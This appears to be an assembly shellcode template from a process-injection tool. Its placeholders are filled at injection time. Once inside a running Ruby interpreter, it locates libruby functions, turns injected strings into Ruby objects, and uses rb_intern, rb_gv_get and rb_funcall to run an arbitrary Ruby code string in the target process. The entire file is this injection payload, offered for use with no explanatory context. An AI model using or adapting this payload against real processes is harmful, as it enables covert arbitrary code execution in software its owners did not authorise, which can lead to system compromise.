// based on some of the general concepts discussed in:
// https://silverhammermba.github.io/emberb/c/
// https://blog.peterzhu.ca/creating-ruby-strings-c/
// https://blog.peterzhu.ca/ruby-c-ext/

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

	push r13

	// copy the Ruby code string to arbitrary read/write memory
	// then make a Ruby string out of it
	// VALUE rb_str_new(const char *ptr, long len);
	push r14
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x1000
	lea esi, ruby_code[eip]
	mov ecx, [VARIABLE:rubycode.length:VARIABLE]
	add ecx, 2												# null terminator
	push edi
	call asminject_copy_bytes
	pop edi
	mov esi, [VARIABLE:rubycode.length:VARIABLE]
	sub esi, 1
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_str_new:RELATIVEOFFSET]
	call ebx
	// keep the pointer around
	mov r10, eax
	pop r14
	// END: copy the Ruby code string to arbitrary read/write memory
	
	// copy the Ruby function name string to arbitrary read/write memory
	// then make a Ruby string out of it
	push r14
	push r10
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x400
	lea esi, ruby_function_name[eip]
	mov ecx, [VARIABLE:rubyfunction.length:VARIABLE]
	add ecx, 2												# null terminator
	push edi
	call asminject_copy_bytes
	pop edi
	mov esi, [VARIABLE:rubyfunction.length:VARIABLE]
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_str_new:RELATIVEOFFSET]
	call ebx
	// keep the pointer around
	mov r9, eax
	pop r10
	pop r14
	// END: copy the Ruby function name string to arbitrary read/write memory
		
	// copy the Ruby global variable name string to arbitrary read/write memory
	// then make a Ruby string out of it
	push r14
	push r10
	push r9
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x800
	lea esi, ruby_global_variable[eip]
	mov ecx, [VARIABLE:globalvariable.length:VARIABLE]
	add ecx, 2												# null terminator
	push edi
	call asminject_copy_bytes
	pop edi
	mov esi, [VARIABLE:globalvariable.length:VARIABLE]
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_str_new:RELATIVEOFFSET]
	call ebx
	// keep the pointer around
	mov r8, eax
	pop r9
	pop r10
	pop r14
	// END: copy the Ruby global variable name string to arbitrary read/write memory
	
	
	
	// BEGIN: call rb_intern to get a pointer to the specified function
	push r14
	push r10
	push r9
	push r8
	push ebx
	// function name Ruby string
	//mov edi, r9
	// function name string
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x400
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_intern:RELATIVEOFFSET]
	call ebx
	// keep the pointer around
	mov r13, eax
	pop ebx
	pop r8
	pop r9
	pop r10
	pop r14
	
	// END: call call rb_intern to get a pointer to the specified function
	
	
	// BEGIN: call rb_gv_get to get a pointer to the specified global variable
	push r14
	push r13
	push r10
	push r9
	push r8
	push ebx
	// global variable name Ruby string
	//mov edi, r8
	// global variable name string
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x800
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_gv_get:RELATIVEOFFSET]
	call ebx
	// keep the pointer around
	mov r12, eax
	pop ebx	
	pop r8
	pop r9
	pop r10
	pop r13
	pop r14
	
	// END: call rb_gv_get
	
	// BEGIN: call rb_funcall, passing the global variable, function, and argument
	push r14
	push r13
	push r12
	push r10
	push r9
	push r8
	push ebx
	// target object
	mov edi, r12
	// function
	mov esi, r13
	// number of arguments
	mov edx, 1
	// code string
	mov ecx, r10
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_funcall:RELATIVEOFFSET]
	call ebx
	pop ebx
	pop r8
	pop r9
	pop r10
	pop r12
	pop r13
	pop r14
	
	// END: call rb_funcall
	
	# // BEGIN: call ruby_cleanup
	# push ebx
	# mov edi, 0
	# mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_cleanup:RELATIVEOFFSET]
	# call ebx
	# pop ebx
	# // END: call ruby_cleanup
	
	#mov eax, 0

	pop r13

SHELLCODE_SECTION_DELIMITER

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"

ruby_function_name:
	.ascii "[VARIABLE:rubyfunction:VARIABLE]\0"

ruby_global_variable:
	.ascii "[VARIABLE:globalvariable:VARIABLE]\0"

#ruby_argv:
#	.ascii "\0"
	
#ruby_argc:
#	.byte 1

